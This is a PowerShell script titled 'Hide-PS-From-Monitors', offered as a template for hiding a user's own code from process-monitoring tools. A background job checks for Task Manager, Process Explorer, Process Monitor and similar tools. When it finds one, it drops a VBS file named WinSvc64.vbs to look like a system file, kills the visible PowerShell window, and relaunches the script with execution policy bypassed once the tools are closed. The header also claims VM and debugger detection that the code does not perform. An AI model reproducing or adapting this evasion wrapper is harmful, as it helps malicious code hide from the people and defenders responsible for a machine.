<# ============================ Hide-PS-From-Monitors ===============================

SYNOPSIS
Uses various methods to determine if the machine is a VM or if debugging or system monitoring software is running.

USAGE
1. Add Your code or execution at the END of the script below.
2. When Monitoring software is running, this script will create and run a vbs file that waits for all monitoring software to be closed.
3. this script will be restarted along with your own code below (line 120 onwards)

#>

$ConsoleName = 'gj589eg59e' # Must match below
[Console]::Title = $ConsoleName
sleep 1

$MasterJOB = {
    $ConsoleName = 'gj589eg59e' # Must match above
    $testConsolePath = $null
    $testConsoleProcess = $null
    $pathMatch = $null

    $vbsblock = @'
taskManagers = Array("taskmgr.exe","procmon.exe","procmon64.exe","procexp.exe","procexp64.exe","perfmon.exe","perfmon64.exe","resmon.exe","resmon64.exe","ProcessHacker.exe")

Function IsProcessRunning(processName)
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name='" & processName & "'")
    If colProcesses.Count > 0 Then
        IsProcessRunning = True
    Else
        IsProcessRunning = False
    End If
End Function

Do
    allClear = True
    For Each taskManager In taskManagers
        If IsProcessRunning(taskManager) Then
            allClear = False
            Exit For
        End If
    Next

    If allClear Then
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "powershell.exe -ExecutionPolicy Bypass -File """ & powerShellScript & """", 1, True
        Exit Do
    End If

    WScript.Sleep 1000
Loop
'@

    while ($true) {
        cls
        Write-Host "Monitoring Software.. " -NoNewline
        $taskManagers = @("taskmgr","procmon","procmon64","procexp","procexp64","perfmon","perfmon64","resmon","resmon64","ProcessHacker")
        $runningTaskManagers = @()
        foreach ($taskManager in $taskManagers) {
            if (Get-Process -Name $taskManager -ErrorAction SilentlyContinue) {
                $runningTaskManagers += $taskManager
            }
        }
    
        $testConsoleProcess = Get-Process | Where-Object { $_.MainWindowTitle -eq "$ConsoleName" }
    
        if ($testConsoleProcess) {
            $wmiQuery = "SELECT CommandLine FROM Win32_Process WHERE ProcessId = $($testConsoleProcess.Id)"
            $wmiProcess = Get-WmiObject -Query $wmiQuery
    
            if(!($pathMatch)){
    
                if ($wmiProcess) {
                    $commandLine = $wmiProcess.CommandLine
                    $pathMatch = $commandLine -replace '.*&\s+''([^'']+)''.*', '$1'
                    
                    if ($pathMatch) {
                        $testConsolePath = $pathMatch
                    }
                }
    
            }
        }
    
        if ($runningTaskManagers.Count -gt 0) {
            Write-Host "Detected!" -ForegroundColor White -BackgroundColor Red
            if ($testConsoleProcess) {
                $vbsfile = "$env:temp\WinSvc64.vbs"

                if (!(Test-Path $vbsfile)){
                    "powerShellScript = `"$testConsolePath`"" | Out-File -FilePath $vbsfile
                    $vbsblock | Out-File -FilePath $vbsfile -Append
                }

                $detect = 1
                Start-Process $vbsfile
                Stop-Process -Id $testConsoleProcess.Id -Force
            }
        } 
        else {
            Write-Host "OK" -ForegroundColor Green
            if (-not $testConsoleProcess -and $testConsolePath -and $detect -gt 0) {
                $detect = 0
            }
        }
    
        sleep 2
    }


}
Start-Job -ScriptBlock $MasterJOB -Name Monitor

# --------------------------------------------------------------------------------------------------------------------
# ADD YOUR SCRIPT BELOW HERE
# --------------------------------------------------------------------------------------------------------------------


# EXAMPLE CODE
while ($true){
    Write-Host "running.."
    sleep 1 
}